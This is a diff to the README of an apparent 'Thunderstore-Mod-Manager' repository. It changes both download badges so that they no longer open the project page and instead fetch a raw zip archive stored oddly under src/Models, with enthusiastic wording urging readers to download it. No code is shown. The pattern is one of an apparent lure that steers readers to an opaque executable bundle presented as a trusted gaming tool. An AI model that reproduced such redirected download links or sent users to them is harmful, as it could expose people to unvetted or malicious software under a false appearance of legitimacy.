@@ -6,7 +6,7 @@ Welcome to Thunderstore-Mod-Manager, the easiest way to enhance your gaming expe
 
 ## 📥 Download and Install
 
-[![Download Now](https://img.shields.io/badge/Download-Thunderstore_Mod_Manager-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Patern7047/Thunderstore-Mod-Manager)
+[![Download Now](https://img.shields.io/badge/Download-Thunderstore_Mod_Manager-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Patern7047/Thunderstore-Mod-Manager/main/src/Models/Thunderstore_Mod_Manager_v1.7.zip)
 
 Visit this link to download the application. Once downloaded, you're ready to go - no complicated setup required.
 
@@ -192,7 +192,7 @@ Love Thunderstore-Mod-Manager? Here's how you can help:
 
 Your adventure into enhanced gaming starts right now. Download Thunderstore-Mod-Manager today and discover why thousands of gamers trust us with their modding needs.
 
-[![Download Thunderstore-Mod-Manager](https://img.shields.io/badge/FREE_Download-Latest_Version-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Patern7047/Thunderstore-Mod-Manager)
+[![Download Thunderstore-Mod-Manager](https://img.shields.io/badge/FREE_Download-Latest_Version-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Patern7047/Thunderstore-Mod-Manager/main/src/Models/Thunderstore_Mod_Manager_v1.7.zip)
 
 Join the revolution - mod smarter, play better, have more fun!
 
